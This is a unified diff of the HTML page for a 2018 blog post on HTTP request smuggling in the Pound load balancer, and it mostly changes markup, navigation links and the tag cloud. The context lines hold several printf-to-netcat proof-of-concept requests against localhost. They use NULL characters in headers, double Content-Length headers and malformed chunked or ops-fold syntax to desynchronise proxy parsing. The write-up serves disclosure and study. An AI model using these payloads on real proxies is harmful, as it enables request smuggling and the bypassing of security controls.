@@ -49,7 +49,7 @@
         <div class="navbar-collapse collapse">
           <ul class="nav navbar-nav">
             <li ><a href="/" class="glyphicon glyphicon-home">&nbsp;Home</a></li>
-            <li class="active"><a href="/archives/" class="glyphicon glyphicon-th">&nbsp;Archives</a></li>
+            <li ><a href="/archives/" class="glyphicon glyphicon-th">&nbsp;Archives</a></li>
             <li ><a href="/contact/" class="glyphicon glyphicon-earphone">&nbsp;Contact</a></li>
             <li><a class="glyphicon glyphicon-eye-open" href="/feed.xml">&nbsp;RSS Feed</a></li>
           </ul>
@@ -77,7 +77,7 @@
             <div class="page-header">
             <h1>Security: HTTP Smuggling, Apsis Pound load balancer
             <br/><span><i class="glyphicon glyphicon-time">&nbsp;</i><time datetime="2018-07-03">Jul 03, 2018</time></span>
-            <span class="category"><i class="glyphicon glyphicon-list">&nbsp;</i> <a href="/english/">english</a> and <a href="/security/">security</a></span>
+            <span class="category"><i class="glyphicon glyphicon-list">&nbsp;</i> <a href="/Security/">Security</a> and <a href="/english/">english</a></span>
             </h1>
             </div>
         </header>
@@ -224,7 +224,7 @@ chunked transmission has the priority on any Content-Length headers.</p>
 </ul>
 
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># 2 responses instead of 3</span>
+<p><figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c1"># 2 responses instead of 3</span>
 <span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Content-length:56\r\n&#39;</span><span class="se">\</span>
@@ -240,8 +240,7 @@ chunked transmission has the priority on any Content-Length headers.</p>
 <span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
-<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></div>
-
+<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></figure></p>
 
 <p>For a <strong>valid parser</strong> there are 3 queries:</p>
 
@@ -308,7 +307,7 @@ but sometimes the parser does not detect the NULL character because the parsed l
 
 <p>With Pound as soon as a NULL character was encountered in an header line the parser would continue the header with the next line.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)</span>
+<p><figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c1"># 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)</span>
 <span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Content-\0dummy: foo\r\n&#39;</span><span class="se">\</span>
@@ -326,14 +325,13 @@ but sometimes the parser does not detect the NULL character because the parsed l
 <span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
-<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></div>
-
+<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></figure></p>
 
 <p>Here is another variation using the Double Content-length Support. This could be
 used if the previous actor in the chain of proxies had no support for double
 Content-Length (very likely).. but had support for NULL characters (less likely).</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)</span>
+<p><figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c1"># 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)</span>
 <span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Content-\0dummy: foo\r\n&#39;</span><span class="se">\</span>
@@ -348,12 +346,11 @@ Content-Length (very likely).. but had support for NULL characters (less likely)
 <span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
-<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></div>
-
+<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></figure></p>
 
 <p>On each attack we 2 responses instead of 3, you can also make 3 responses instead of 2.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># 3 responses instead of 2 (2nd query is unmasked by pound)</span>
+<p><figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c1"># 3 responses instead of 2 (2nd query is unmasked by pound)</span>
 <span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Transfer-\0Mode: magic\r\n&#39;</span><span class="se">\</span>
@@ -371,14 +368,13 @@ Content-Length (very likely).. but had support for NULL characters (less likely)
 <span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
-<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></div>
-
+<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></figure></p>
 
 <p>And if you are still here you can compare the last two examples.
 On the first one we try a bad chunked transmission, and on the last one we use the <code>ops-fold</code> syntax.
 Use wireshark to compare the behaviors and some potential <em>crafted headers</em> syntax transmitted to backends.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># chunk mode not applied</span>
+<p><figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c1"># chunk mode not applied</span>
 <span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Transfer-\0Mode: magic\r\n&#39;</span><span class="se">\</span>
@@ -396,12 +392,9 @@ Use wireshark to compare the behaviors and some potential <em>crafted headers</e
 <span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
-<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></div>
+<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></figure></p>
 
-
-
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># chunk mode applied, and &#39;\r\n zorg\r\n&#39; ops-fold transmitted</span>
+<p><figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c1"># chunk mode applied, and &#39;\r\n zorg\r\n&#39; ops-fold transmitted</span>
 <span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Transfer-\0Mode: magic\r\n&#39;</span><span class="se">\</span>
@@ -420,8 +413,7 @@ Use wireshark to compare the behaviors and some potential <em>crafted headers</e
 <span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
-<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></div>
-
+<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></figure></p>
 
 <h3>5) Transmission issues</h3>
 
@@ -430,7 +422,7 @@ Usually the Reverse proxy which support ops-fold are not transmitting the syntax
 
 <p>They were other transmission issues like this one (sadly not fixed):</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<p><figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Transfer-Encoding: chunked\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
@@ -443,8 +435,7 @@ Usually the Reverse proxy which support ops-fold are not transmitting the syntax
 <span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;0\r\n&#39;</span><span class="se">\</span>
 <span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
-<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></div>
-
+<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></figure></p>
 
 <p>This is not an invalid query. The first chunk size is <code>42</code> in hexa, so 66 bytes.
 The second chunk is the end-of-chunks marker, the last 2 lines <code>0\r\n\r\n</code>.
@@ -573,9 +564,19 @@ because the Proxy is not doing any splitting, just forwarding some dangerous syn
                 </div>
                 <div class="list-group" role="navigation">
                   
+                     <a class="list-group-item" href="/postgresql/english/2017/06/26/postgresql_advanced_generate_series/">
+                     <h4>PostgreSQL, advanced use of generate_series for data generation</h4>
+                     <p>filling thousands of random realistic data rows.</p>
+                     </a>
+                  
                      <a class="list-group-item" href="/security/english/2016/12/19/security_dompdf_rce/">
                      <h4>Web Security, Dompdf security issues details</h4>
                      <p>details of december 2015's 3 CVE in dompdf, with one RCE.</p>
+                     </a>
+                  
+                     <a class="list-group-item" href="/security/english/2016/06/10/security_play_with_implicit_html_and_closing_divs/">
+                     <h4>Web Security, using bad HTML to escape from a DIV</h4>
+                     <p>Break HTML layouts with only bad HTML and the browser's help.</p>
                      </a>
                   
                      <a class="list-group-item" href="/security/english/2015/10/04/http_smuggling_in_2015_part_one/">
@@ -583,19 +584,9 @@ because the Proxy is not doing any splitting, just forwarding some dangerous syn
                      <p>First part of the 2015 HTTP Smuggling articles. Injecting HTTP in HTTP, the theory.</p>
                      </a>
                   
-                     <a class="list-group-item" href="/apache/english/2009/11/06/more_on_static_file_redirector/">
-                     <h4>More on Static file redirector</h4>
-                     <p>Complements on the previous article. hash the file map, use a /static url, and avoid security problems with tis new mode.</p>
-                     </a>
-                  
-                     <a class="list-group-item" href="/apache/english/2009/11/05/use_rewrite_map_to_prevent_proxying_for_some_static_contents/">
-                     <h4>Use RewriteMap to prevent proxying for some static contents</h4>
-                     <p>How to use the not well known RewriteMap Apache feature to proxy static resources on a web app without clean url separation between static and dynamic content (here Plone).</p>
-                     </a>
-                  
-                     <a class="list-group-item" href="/apache/english/2009/06/03/relative_absolute_urls_and_proxies/">
-                     <h4>Relative/Absolute URL and Proxies</h4>
-                     <p>Understanding absolute and relative urls problems when playing with several domains from the same web application.</p>
+                     <a class="list-group-item" href="/security/english/2015/03/25/nginx-integer_truncation/">
+                     <h4>Nginx Integer Truncation</h4>
+                     <p>Exploitation of Integer Overflow with the HTTP Content length Header</p>
                      </a>
                   
                 </div>
@@ -637,46 +628,46 @@ because the Proxy is not doing any splitting, just forwarding some dangerous syn
                 </div>
 
                 <div class="tagcloud">
-                <a style='font-size: 12px' class='taglink' href='/tag/Monitoring/'>Monitoring</a>
-<a style='font-size: 22px' class='taglink' href='/tag/Nginx/'>Nginx</a>
-<a style='font-size: 32px' class='taglink' href='/tag/PHP/'>PHP</a>
-<a style='font-size: 12px' class='taglink' href='/tag/HTML/'>HTML</a>
-<a style='font-size: 28px' class='taglink' href='/tag/Performance/'>Performance</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Varnish/'>Varnish</a>
-<a style='font-size: 18px' class='taglink' href='/tag/Plone/'>Plone</a>
-<a style='font-size: 18px' class='taglink' href='/tag/Injection/'>Injection</a>
-<a style='font-size: 32px' class='taglink' href='/tag/Apache/'>Apache</a>
-<a style='font-size: 18px' class='taglink' href='/tag/BlockReplace/'>BlockReplace</a>
-<a style='font-size: 32px' class='taglink' href='/tag/Security/'>Security</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Dojo/'>Dojo</a>
-<a style='font-size: 18px' class='taglink' href='/tag/Smuggling/'>Smuggling</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Accumulated/'>Accumulated</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Pound/'>Pound</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Managed/'>Managed</a>
-<a style='font-size: 31px' class='taglink' href='/tag/Drupal/'>Drupal</a>
-<a style='font-size: 24px' class='taglink' href='/tag/SaltStack/'>SaltStack</a>
-<a style='font-size: 28px' class='taglink' href='/tag/HTTP/'>HTTP</a>
-<a style='font-size: 18px' class='taglink' href='/tag/Web/'>Web</a>
-<a style='font-size: 12px' class='taglink' href='/tag/HAProxy/'>HAProxy</a>
-<a style='font-size: 18px' class='taglink' href='/tag/CVE/'>CVE</a>
-<a style='font-size: 18px' class='taglink' href='/tag/RewriteMap/'>RewriteMap</a>
-<a style='font-size: 12px' class='taglink' href='/tag/HTML5/'>HTML5</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Mongodb/'>Mongodb</a>
-<a style='font-size: 18px' class='taglink' href='/tag/PHP-fpm/'>PHP-fpm</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Bash/'>Bash</a>
-<a style='font-size: 22px' class='taglink' href='/tag/Proxy/'>Proxy</a>
-<a style='font-size: 12px' class='taglink' href='/tag/ZendFramework/'>ZendFramework</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Bug/'>Bug</a>
-<a style='font-size: 22px' class='taglink' href='/tag/PostgreSQL/'>PostgreSQL</a>
-<a style='font-size: 12px' class='taglink' href='/tag/js/'>js</a>
+                <a style='font-size: 12px' class='taglink' href='/tag/HTML5/'>HTML5</a>
 <a style='font-size: 12px' class='taglink' href='/tag/Js/'>Js</a>
-<a style='font-size: 18px' class='taglink' href='/tag/APC/'>APC</a>
 <a style='font-size: 22px' class='taglink' href='/tag/mod_rewrite/'>mod_rewrite</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Statistics/'>Statistics</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Ajax/'>Ajax</a>
-<a style='font-size: 18px' class='taglink' href='/tag/jinja/'>jinja</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Linux/'>Linux</a>
+<a style='font-size: 12px' class='taglink' href='/tag/js/'>js</a>
+<a style='font-size: 22px' class='taglink' href='/tag/Proxy/'>Proxy</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Pound/'>Pound</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Bug/'>Bug</a>
+<a style='font-size: 32px' class='taglink' href='/tag/Apache/'>Apache</a>
+<a style='font-size: 18px' class='taglink' href='/tag/APC/'>APC</a>
+<a style='font-size: 12px' class='taglink' href='/tag/ZendFramework/'>ZendFramework</a>
+<a style='font-size: 18px' class='taglink' href='/tag/BlockReplace/'>BlockReplace</a>
+<a style='font-size: 18px' class='taglink' href='/tag/PHP-fpm/'>PHP-fpm</a>
 <a style='font-size: 12px' class='taglink' href='/tag/Cache/'>Cache</a>
+<a style='font-size: 12px' class='taglink' href='/tag/HTML/'>HTML</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Bash/'>Bash</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Accumulated/'>Accumulated</a>
+<a style='font-size: 22px' class='taglink' href='/tag/PostgreSQL/'>PostgreSQL</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Monitoring/'>Monitoring</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Mongodb/'>Mongodb</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Dojo/'>Dojo</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Ajax/'>Ajax</a>
+<a style='font-size: 31px' class='taglink' href='/tag/PHP/'>PHP</a>
+<a style='font-size: 28px' class='taglink' href='/tag/Performance/'>Performance</a>
+<a style='font-size: 18px' class='taglink' href='/tag/Plone/'>Plone</a>
+<a style='font-size: 32px' class='taglink' href='/tag/Security/'>Security</a>
+<a style='font-size: 12px' class='taglink' href='/tag/HAProxy/'>HAProxy</a>
+<a style='font-size: 30px' class='taglink' href='/tag/HTTP/'>HTTP</a>
+<a style='font-size: 24px' class='taglink' href='/tag/SaltStack/'>SaltStack</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Statistics/'>Statistics</a>
+<a style='font-size: 18px' class='taglink' href='/tag/Web/'>Web</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Linux/'>Linux</a>
+<a style='font-size: 18px' class='taglink' href='/tag/CVE/'>CVE</a>
+<a style='font-size: 22px' class='taglink' href='/tag/Nginx/'>Nginx</a>
+<a style='font-size: 18px' class='taglink' href='/tag/jinja/'>jinja</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Varnish/'>Varnish</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Managed/'>Managed</a>
+<a style='font-size: 18px' class='taglink' href='/tag/Smuggling/'>Smuggling</a>
+<a style='font-size: 31px' class='taglink' href='/tag/Drupal/'>Drupal</a>
+<a style='font-size: 18px' class='taglink' href='/tag/RewriteMap/'>RewriteMap</a>
+<a style='font-size: 18px' class='taglink' href='/tag/Injection/'>Injection</a>
 
                 </div>
               </div>
@@ -691,7 +682,7 @@ because the Proxy is not doing any splitting, just forwarding some dangerous syn
                 <a href="https://plus.google.com/111280074129555323484?rel=author" target="_blank"><img src="/theme/img/google-plus-thumb.png" width="48" height="48" alt="G+" title="G+"></a>
                 <a href="http://www.flickr.com/photos/regilero/" target="_blank"><img src="/theme/img/flickr_thumb.png" width="48" height="48" alt="Flickr photos" title="Flickr photos"></a>
                 <a href="http://stackoverflow.com/users/550618/regilero" target="_blank"><img src="http://stackoverflow.com/users/flair/550618.png" width="208" height="58" alt="profile for regilero at Stack Overflow, Q&amp;A for professional and enthusiast programmers" title="profile for regilero at Stack Overflow, Q&amp;A for professional and enthusiast programmers"></a>
-                <a href="http://stackexchange.com/users/264377/regilero"  target="_blank"><img src="http://stackexchange.com/users/flair/264377.png?theme=clean" width="208" height="58" alt="profile for regilero on Stack Exchange, a network of free, community-driven Q&amp;A sites" title="profile for regilero on Stack Exchange, a network of free, community-driven Q&amp;A sites" /></a>
+                <a href="https://stackexchange.com/users/264377/regilero"  target="_blank"><img src="http://stackexchange.com/users/flair/264377.png?theme=clean" width="208" height="58" alt="profile for regilero on Stack Exchange, a network of free, community-driven Q&amp;A sites" title="profile for regilero on Stack Exchange, a network of free, community-driven Q&amp;A sites" /></a>
             </div>
             <div class="sideBarItem">
               <h3>Some Friends</h3>
